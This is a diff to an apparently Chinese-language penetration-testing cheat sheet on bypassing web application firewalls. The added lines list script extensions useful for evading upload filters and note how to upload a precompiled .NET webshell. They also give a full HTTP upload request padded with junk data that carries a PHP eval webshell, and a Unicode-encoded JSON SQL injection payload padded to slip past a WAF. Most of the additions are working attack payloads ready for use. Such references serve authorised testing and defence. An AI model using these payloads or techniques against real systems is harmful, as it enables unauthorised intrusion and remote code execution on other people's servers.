@@ -36,14 +36,52 @@
   - mid()、substr() = substring()
   - @@user = user()
   - @@datadir = datadir()
+
 - 文件上传
-  - php = phtml、php3、php4、php5、pht、phps
+  - 注意，当 `.net` 应用整套程序用了预编译，直接上传脚本语言 `aspx` 任何可解析后缀的木马是没有办法解析的，需要用 `aspnet_compiler.exe` 进行编译，然后把 `dll`，`compiled` 这两个文件上传到目标的 `bin` 目录中。
+    - 参考链接
+      - https://www.cnblogs.com/bmjoker/p/16794685.html
+      - https://forum.butian.net/share/1769
+
+| 脚本语言  | 可解析后缀 |
+| :---------:| ------------- |
+| asp      | `.asp`、`.asa`、`.cer`、`.cdx`、`.htr`、`.cfm`、`.stm`、`.shtm`、`.shtml`  |
+| aspx     | `.aspx`、`.asax`、`.ashx`、`.ashm`、`.asmx`、`.ascx`、`.svc`、`.soap`、`.cshtml`、`.config`  |
+| php      | `.php`、`.phtml`、`.php2`、`.php3`、`.php4`、`.php5`、`.pht`、`.phps`、`.php::$DATA`、`.htaccess` |
+| jsp      | `.jsp`、`.jspx`、`.jspf`、`.jspa`、`.jsw`、`.jsv`、`.jtml`、`.war` |
+
+
 
 # Waf检测限制绕过
 原理：超出waf检测能力部分不会拦截。
 
 ## 垃圾字符
 原理：一些WAF设置了过滤的数据包长度，如果数据包太大太长，为了考虑性能就会直接略过这个数据包。
+
+- 文件上传
+  - 在文件内容中插入垃圾数据（绕过文件内容检测）
+
+```
+POST /index.php HTTP/1.1
+Host: test.com
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzEHC1GyG8wYOH1rf
+Connection: close
+
+------WebKitFormBoundaryzEHC1GyG8wYOH1rf
+Content-Disposition: form-data; name="upload_file"; filename="shell.php"
+Content-Type: image/png
+
+fbf0fd31ead48dcc0b9f2312bf111...80万个1...1118658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf
+<?php @eval($_POST['x']);?>
+
+------WebKitFormBoundaryzEHC1GyG8wYOH1rf
+Content-Disposition: form-data; name="submit"
+
+上传
+------WebKitFormBoundaryzEHC1GyG8wYOH1rf--
+```
+
+
 - 文件上传
   - name与filename之间插入垃圾数据
     - 注：需在大量垃圾数据后加 `;`
@@ -143,6 +181,19 @@ Host: Host
 User-Agent: Mozilla/5.0
 Accept: */*
 ```
+
+## 垃圾字符+Unicode编码
+- sqli
+  - JSON 对 Unicode 转义的支持​​
+    - JSON 标准（RFC 8259）明确规定：
+      - Unicode 转义是合法语法​​：任何字符都可以通过 \uXXXX（4位十六进制）或 \u{XXXXXX}（扩展格式）表示。
+      - ​​例如​​：单引号 `'` 可表示为 `\u0027` ，双引号 `"` 可表示为 `\u0022`。
+
+  - 响应与 `username` 的值直接为 `admin` 一致，说明成功绕过waf：
+```json
+{"username":"{{unicode:encode(admin' and 1=1 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------)}}","password":"9876!QAXwsx"}
+```
+
 
 ## 参数溢出
 原理：通过增加传递得参数数量，达到waf检测上限，超出的参数就可绕过waf了。可绕一些轻量级waf，如phpstudy自带waf。
